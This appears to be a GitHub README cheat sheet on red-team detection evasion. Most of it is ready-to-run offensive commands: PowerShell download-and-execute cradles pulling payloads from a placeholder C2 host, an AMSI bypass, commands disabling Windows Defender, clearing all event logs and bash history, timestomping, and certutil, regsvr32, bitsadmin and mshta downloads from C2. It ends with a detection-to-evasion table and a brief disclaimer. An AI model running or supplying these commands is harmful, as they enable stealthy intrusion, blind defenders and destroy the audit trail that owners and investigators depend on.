# Red Team vs Blue Team

**Adversarial Simulation · Detection Evasion · OPSEC · Threat Hunting · SOC Bypass**

![Red Team](https://img.shields.io/badge/RED-TEAM-ff0000?style=for-the-badge&logo=target&logoColor=white&labelColor=1a0000)
![Blue Team](https://img.shields.io/badge/BLUE-TEAM-0052CC?style=for-the-badge&logo=shield&logoColor=white&labelColor=000d1a)
![OPSEC](https://img.shields.io/badge/OPSEC-EVASION-8b0000?style=for-the-badge&logo=linux&logoColor=white&labelColor=1a0000)
![SIEM](https://img.shields.io/badge/SIEM-BYPASS-D32F2F?style=for-the-badge&logo=elastic&logoColor=white&labelColor=1a0000)
![Platform](https://img.shields.io/badge/PLATFORM-WINDOWS%20%7C%20LINUX-333333?style=for-the-badge&labelColor=1a0000)

---

```
[*] Objective: Understand the defender. Become invisible to them.
[*] Know what they monitor. Break their visibility.
[*] OPSEC is not optional — it is survival.
```

---

## Table of Contents

1. [Red Team vs Blue Team](#1-red-team-vs-blue-team)
2. [What Blue Team Monitors](#2-what-blue-team-monitors)
3. [How Blue Team Detects You](#3-how-blue-team-detects-you)
4. [OPSEC Fundamentals](#4-opsec-fundamentals)
5. [Network Evasion](#5-network-evasion)
6. [Endpoint Evasion](#6-endpoint-evasion)
7. [Log Evasion & Tampering](#7-log-evasion--tampering)
8. [Living off the Land (LOLBins)](#8-living-off-the-land-lolbins)
9. [C2 Evasion Techniques](#9-c2-evasion-techniques)
10. [AV / EDR Bypass Overview](#10-av--edr-bypass-overview)
11. [Common Red Team Mistakes](#11-common-red-team-mistakes)
12. [Detection vs Evasion Cheatsheet](#12-detection-vs-evasion-cheatsheet)

---

## 1. Red Team vs Blue Team

```
┌─────────────────────────────────────────────────────────────────┐
│                    THE BATTLEFIELD                              │
├──────────────────────────┬──────────────────────────────────────┤
│       RED TEAM           │           BLUE TEAM                 │
├──────────────────────────┼──────────────────────────────────────┤
│  Offensive Security      │  Defensive Security                 │
│  Simulate real attackers │  Detect & respond to attacks        │
│  Find gaps in defense    │  Harden & monitor the environment   │
│  Exploit vulnerabilities │  Patch & remediate vulnerabilities  │
│  Operate covertly        │  Hunt for threats proactively       │
│  Think like adversaries  │  Think like defenders               │
└──────────────────────────┴──────────────────────────────────────┘
```

| Attribute | Red Team | Blue Team |
|---|---|---|
| Goal | Breach & persist undetected | Detect, respond & prevent |
| Tools | Metasploit, Cobalt Strike, Sliver | Wazuh, Splunk, Defender, EDR |
| Mindset | Attacker | Defender |
| Output | Attack path report | Incident response report |
| Triggers | Authorized engagement | Alerts, anomalies, IOCs |
| Works with | Purple Team (shared) | SOC, IR, Threat Intel |

---

## 2. What Blue Team Monitors

```
[~] Understanding their visibility = Your survival
```

### Network Layer
```
[+] Firewall logs          → Inbound/outbound connections
[+] IDS/IPS alerts         → Signature-based traffic detection
[+] DNS queries            → Suspicious domains, DGA, tunneling
[+] NetFlow / traffic logs → Beaconing patterns, data exfil
[+] Proxy logs             → HTTP/S traffic, user-agents
[+] VPN logs               → Auth attempts, geo anomalies
```

### Endpoint Layer
```
[+] Windows Event Logs     → Login, process, service events
[+] Sysmon logs            → Process creation, network conn, file ops
[+] EDR telemetry          → Memory injection, hollowing, hooks
[+] PowerShell logs        → Script block, module, transcription
[+] WMI activity           → Lateral movement, persistence
[+] Registry changes       → Run keys, autostart modifications
[+] File integrity (FIM)   → New/modified files in sensitive paths
```

### Identity & Auth Layer
```
[+] AD logs                → Kerberos, NTLM, LDAP queries
[+] Failed logins          → Brute force, password spray
[+] Privileged account use → Admin logins at odd hours
[+] Service account abuse  → Unusual service account behavior
[+] DCSync / DCShadow      → Replication anomalies
```

### Application Layer
```
[+] Web server logs        → Scanning, SQLi, LFI patterns
[+] Email logs             → Phishing indicators, attachments
[+] Cloud audit logs       → AWS CloudTrail, Azure Monitor
```

---

## 3. How Blue Team Detects You

```
[!] Common detection triggers — avoid all of these
```

```
[1] SIGNATURE-BASED
    → Known malware hashes
    → Known tool names (mimikatz.exe, nc.exe)
    → Known C2 domains / IPs
    → Yara rules matching your payloads

[2] BEHAVIOUR-BASED
    → Unusual process parent-child relationships
    → cmd.exe / powershell.exe spawned by Office apps
    → LSASS memory access
    → Encoded/obfuscated PowerShell commands
    → Network connections from non-browser processes

[3] ANOMALY-BASED
    → Login at 3AM from new IP
    → Sudden spike in DNS queries
    → Large data transfer to external IP
    → Lateral movement across multiple hosts in minutes
    → New scheduled task / service created

[4] THREAT INTELLIGENCE
    → Your C2 IP flagged in threat feeds
    → TLS certificate fingerprint (JA3/JA3S)
    → HTTP headers matching known frameworks
    → User-agent strings from Cobalt Strike / Metasploit
```

---

## 4. OPSEC Fundamentals

```
[*] OPSEC = Operational Security
[*] Rule #1: Leave no trace
[*] Rule #2: Blend in with normal traffic
[*] Rule #3: Never reuse infrastructure
```

### OPSEC Checklist

```
[ ] Use dedicated attacker infrastructure (never personal IPs)
[ ] Rotate C2 servers per engagement
[ ] Use domain fronting or CDN-based C2
[ ] Register domains 30+ days before use (aged domains)
[ ] Match C2 traffic to legitimate services (HTTPS, DNS)
[ ] Never use default tool configs (change headers, ports, UAs)
[ ] Disable/clear bash history on Linux pivots
[ ] Clear Windows event logs after operations
[ ] Use HTTPS with valid TLS certs on C2
[ ] Avoid scanning from C2 servers directly
[ ] Compartmentalize: recon box ≠ exploit box ≠ C2 box
```

---

## 5. Network Evasion

### Blend into Normal Traffic

```bash
# Use common ports — don't stand out
443   → HTTPS  (most trusted, rarely blocked)
80    → HTTP
53    → DNS tunneling
8080  → HTTP alt
```

### DNS Tunneling (C2 over DNS)

```bash
# iodine — tunnel IP over DNS
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com   # server
iodine -f -P password tunnel.yourdomain.com                  # client
```

### Domain Fronting

```
[*] Route C2 traffic through CDN (Cloudflare, Fastly, Azure)
[*] Outbound traffic looks like it goes to cdn.azure.com
[*] Actual destination is your C2 — hidden from Blue Team
```

### Slow Beaconing (Avoid NetFlow Anomalies)

```
# Cobalt Strike — set long sleep intervals
set sleeptime "300000";    # 5 minutes between beacons
set jitter     "30";       # 30% jitter variation
```

### Avoid Noisy Scanning

```bash
# Slow Nmap scan — stay under IDS threshold
nmap -T1 -sS --scan-delay 5s 10.10.10.0/24

# Decoy scan — mix your IP with fake sources
nmap -D RND:10 -sS 10.10.10.5

# Fragment packets to evade IDS
nmap -f -sS 10.10.10.5
```

---

## 6. Endpoint Evasion

### Process Injection (avoid creating new processes)

```
[+] Process Hollowing      → Hollow legit process, inject shellcode
[+] DLL Injection          → Inject DLL into running process
[+] Thread Hijacking       → Hijack existing thread in target process
[+] APC Injection          → Queue APC to thread in target process
[+] Reflective DLL Loading → Load DLL from memory without touching disk
```

### Bypass PowerShell Logging

```powershell
# Disable Script Block Logging via registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockLogging" -Value 0

# Use PowerShell v2 (no script block logging support)
powershell -version 2 -Command "IEX(New-Object Net.WebClient).DownloadString('http://C2/payload')"

# Encode commands to avoid string detection
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://C2/shell.ps1')"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc
```

### AMSI Bypass

```powershell
# Patch AMSI in memory (classic — may be detected)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Disable Windows Defender

```powershell
# Disable real-time monitoring (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Add exclusion path
Add-MpPreference -ExclusionPath "C:\Users\Public"

# Disable via registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

---

## 7. Log Evasion & Tampering

### Clear Windows Event Logs

```powershell
# Clear all logs
wevtutil el | ForEach-Object { wevtutil cl "$_" }

# Clear specific logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

### Clear Linux Bash History

```bash
# Disable history for current session
unset HISTFILE
export HISTSIZE=0

# Clear existing history
history -c && history -w
cat /dev/null > ~/.bash_history

# Operate without history
HISTFILE=/dev/null bash
```

### Timestomp (Modify File Timestamps)

```bash
# Linux — match timestamps of system file
touch -r /bin/ls /tmp/payload.sh

# Windows — modify timestamps via PowerShell
$file = Get-Item "C:\Users\Public\payload.exe"
$file.CreationTime     = "01/01/2023 10:00:00"
$file.LastWriteTime    = "01/01/2023 10:00:00"
$file.LastAccessTime   = "01/01/2023 10:00:00"
```

---

## 8. Living off the Land (LOLBins)

```
[*] Use OS-native tools — no payload dropped, no AV alert
[*] Blue Team must distinguish legitimate vs malicious use
```

### Windows LOLBins

| Binary | Abuse Technique |
|---|---|
| `certutil.exe` | Download files, decode base64 |
| `mshta.exe` | Execute HTA / remote scripts |
| `regsvr32.exe` | Execute remote SCT files (Squiblydoo) |
| `rundll32.exe` | Execute arbitrary DLLs |
| `wmic.exe` | Remote execution, lateral movement |
| `bitsadmin.exe` | Download files silently |
| `msiexec.exe` | Execute remote MSI payloads |
| `powershell.exe` | Everything |
| `cscript/wscript` | Execute VBS/JS scripts |
| `schtasks.exe` | Persistence via scheduled tasks |

```powershell
# certutil — download payload
certutil -urlcache -split -f http://C2/payload.exe C:\Windows\Temp\p.exe

# regsvr32 — Squiblydoo (bypass AppLocker)
regsvr32 /s /n /u /i:http://C2/payload.sct scrobj.dll

# bitsadmin — silent download
bitsadmin /transfer job /download /priority high http://C2/file.exe C:\Temp\file.exe

# mshta — remote HTA execution
mshta http://C2/payload.hta
```

---

## 9. C2 Evasion Techniques

```
[*] Your C2 traffic is the biggest detection risk
[*] Make it look like normal business traffic
```

### Malleable C2 Profiles (Cobalt Strike)

```
# Mimic Google traffic
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set uri       "/search?q=updates&client=firefox-b-d";
header "Host" "www.google.com";
```

### Sliver C2 — HTTPS Implant

```bash
# Generate HTTPS implant
generate --mtls YOUR_C2_IP:443 --os windows --arch amd64 --save /tmp/implant.exe

# Start listener
mtls --lport 443
```

### HTTP Traffic Blending

```
[+] Use legitimate-looking User-Agents
[+] Match beacon intervals to browser polling
[+] Add fake HTTP headers (Referrer, Accept-Language)
[+] Use HTTPS with valid TLS cert (Let's Encrypt)
[+] Host decoy content on C2 (looks like a real web server)
```

---

## 10. AV / EDR Bypass Overview

```
[*] Static  → Signature matching on file/binary
[*] Dynamic → Behaviour at runtime
[*] Memory  → Scanning injected memory regions
```

| Bypass Technique | Defeats |
|---|---|
| Obfuscation / encoding | Static AV signatures |
| Packing / encryption | Static AV signatures |
| In-memory execution | On-disk detection |
| Reflective DLL loading | File-based EDR |
| Process injection | Process monitoring |
| AMSI patching | PowerShell AMSI scan |
| ETW patching | Event Tracing for Windows |
| Direct syscalls | User-mode API hooks |
| Unhooking NTDLL | EDR user-mode hooks |
| Sleep + jitter | Sandbox time checks |

---

## 11. Common Red Team Mistakes

```
[!] These get Red Teamers caught — don't do them
```

```
[-] Using default tool names        → rename mimikatz.exe
[-] Running Nmap at full speed      → use -T1, slow scans
[-] Reusing C2 infrastructure       → burn after each op
[-] Operating during business hours → blend timing with normal hours
[-] Forgetting to clear logs        → always clean up
[-] Using same payload twice        → regenerate per target
[-] Hardcoded IPs in payloads       → use domain names
[-] Ignoring EDR telemetry          → understand what EDR logs
[-] Large file transfers            → chunk and stage exfil
[-] Noisy LDAP enumeration          → use targeted LDAP queries
```

---

## 12. Detection vs Evasion Cheatsheet

| Blue Team Detection | Red Team Evasion |
|---|---|
| Process creation logs | Inject into existing processes |
| PowerShell script block logging | PSv2, encoding, AMSI bypass |
| Network beaconing pattern | Jitter + long sleep intervals |
| Known C2 signatures | Malleable profiles, domain fronting |
| LSASS memory access | Use Nanodump, indirect syscalls |
| Mimikatz detection | Rename binary, obfuscate, reflective load |
| DNS anomalies | Blend DNS queries, use legit resolvers |
| New scheduled tasks | Hijack existing tasks instead |
| File written to disk | In-memory payloads only |
| Event log alerts | Clear logs, disable logging |
| EDR API hooks | Unhook NTDLL, direct syscalls |
| TLS fingerprinting (JA3) | Custom TLS stack, randomize cipher order |

---

```
[*] Final Rule:
    The best Red Teamer is the one Blue Team never knew was there.
```

---

## References

- [MITRE ATT&CK](https://attack.mitre.org) — Adversary tactics & techniques
- [LOLBins](https://lolbas-project.github.io) — Living off the land binaries
- [GTFOBins](https://gtfobins.github.io) — Linux LOLBins
- [Cobalt Strike Malleable C2](https://hstechdocs.helpsystems.com/manuals/cobaltstrike) — C2 profile docs
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Payload reference

---

## ⚠️ Disclaimer

```
[!] For EDUCATIONAL and AUTHORIZED TESTING purposes only.
[!] Use only on systems you own or have explicit permission to test.
[!] Author is NOT responsible for any misuse.
```

---

## License

MIT
